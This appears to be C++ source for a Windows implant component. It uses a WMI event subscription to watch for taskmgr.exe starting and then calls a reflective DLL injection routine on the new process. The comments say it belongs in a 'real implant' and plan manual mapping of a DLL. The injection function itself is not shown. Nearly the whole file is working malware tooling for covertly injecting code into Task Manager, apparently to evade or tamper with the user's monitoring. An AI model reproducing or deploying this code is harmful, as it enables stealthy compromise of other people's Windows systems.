#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <wbemidl.h>
#include <comdef.h>
#include "resource1.h"
#include "injection.h"

#pragma comment(lib, "wbemuuid.lib")

// ── Sink implementation ──────────────────────────────────────────
class CProcessSink : public IWbemObjectSink {
    LONG m_refCount = 0;

public:
    // IUnknown
    ULONG STDMETHODCALLTYPE AddRef() override {
        return InterlockedIncrement(&m_refCount);
    }

    ULONG STDMETHODCALLTYPE Release() override {
        LONG count = InterlockedDecrement(&m_refCount);
        if (count == 0) delete this;
        return count;
    }

    HRESULT STDMETHODCALLTYPE QueryInterface(REFIID riid, void** ppv) override {
        if (riid == IID_IUnknown || riid == IID_IWbemObjectSink) {
            *ppv = static_cast<IWbemObjectSink*>(this);
            AddRef();
            return S_OK;
        }
        *ppv = nullptr;
        return E_NOINTERFACE;
    }

    // IWbemObjectSink
    HRESULT STDMETHODCALLTYPE Indicate(
        LONG lObjectCount,
        IWbemClassObject** apObjArray) override
    {
        // inject here. ill manually map a dll here later for now loadlibrary
        // apObjArray contains event data including PID
        DWORD pid = 0;

        for (LONG i = 0; i < lObjectCount; i++) {
            VARIANT vtPid;
            VariantInit(&vtPid);

            // get the PID of the new process
            apObjArray[i]->Get(L"ProcessID", 0, &vtPid, nullptr, nullptr);
            pid = vtPid.uintVal;
            VariantClear(&vtPid);

        }
        


        printf("About to call reflective_inject with pid: %lu\n", pid);
        __try {
            reflective_inject(pid);
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            printf("Exception in reflective_inject: 0x%08X\n", GetExceptionCode());
        }

        return S_OK;
    }

    HRESULT STDMETHODCALLTYPE SetStatus(
        LONG lFlags,
        HRESULT hResult,
        BSTR strParam,
        IWbemClassObject* pObjParam) override
    {
        return S_OK;
    }
};

// ── WMI setup ────────────────────────────────────────────────────
extern "C" BOOL WatchForTaskmgr() {

    // 1. Init COM
    HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    if (FAILED(hr)) return FALSE;

    // 2. Set COM security
    hr = CoInitializeSecurity(
        nullptr, -1, nullptr, nullptr,
        RPC_C_AUTHN_LEVEL_DEFAULT,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        nullptr, EOAC_NONE, nullptr
    );
    if (FAILED(hr)) { CoUninitialize(); return FALSE; }

    // 3. Create WMI locator
    IWbemLocator* pLocator = nullptr;
    hr = CoCreateInstance(
        CLSID_WbemLocator, nullptr,
        CLSCTX_INPROC_SERVER,
        IID_IWbemLocator,
        reinterpret_cast<void**>(&pLocator)
    );
    if (FAILED(hr)) { CoUninitialize(); return FALSE; }

    // 4. Connect to WMI
    IWbemServices* pServices = nullptr;
    hr = pLocator->ConnectServer(
        _bstr_t(L"root\\cimv2"),
        nullptr, nullptr, nullptr,
        WBEM_FLAG_CONNECT_USE_MAX_WAIT,
        nullptr, nullptr,
        &pServices
    );
    pLocator->Release();
    if (FAILED(hr)) { CoUninitialize(); return FALSE; }

    // 5. Set proxy security
    hr = CoSetProxyBlanket(
        pServices,
        RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr,
        RPC_C_AUTHN_LEVEL_CALL,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        nullptr, EOAC_NONE
    );
    if (FAILED(hr)) { pServices->Release(); CoUninitialize(); return FALSE; }

    // 6. Create sink
    CProcessSink* pSink = new CProcessSink();
    IWbemObjectSink* pStubSink = nullptr;

    // 7. Register async notification query
    hr = pServices->ExecNotificationQueryAsync(
        _bstr_t(L"WQL"),
        _bstr_t(L"SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'taskmgr.exe'"),
        WBEM_FLAG_SEND_STATUS,
        nullptr,
        pSink
    );
    if (FAILED(hr)) {
        pSink->Release();
        pServices->Release();
        CoUninitialize();
        return FALSE;
    }

    printf("[+] Watching for taskmgr.exe...\n");


    // In real implant this runs on a background thread, delete later
    Sleep(INFINITE);

    // cleanup
    pServices->CancelAsyncCall(pSink);
    pSink->Release();
    pServices->Release();
    CoUninitialize();
    return TRUE;
}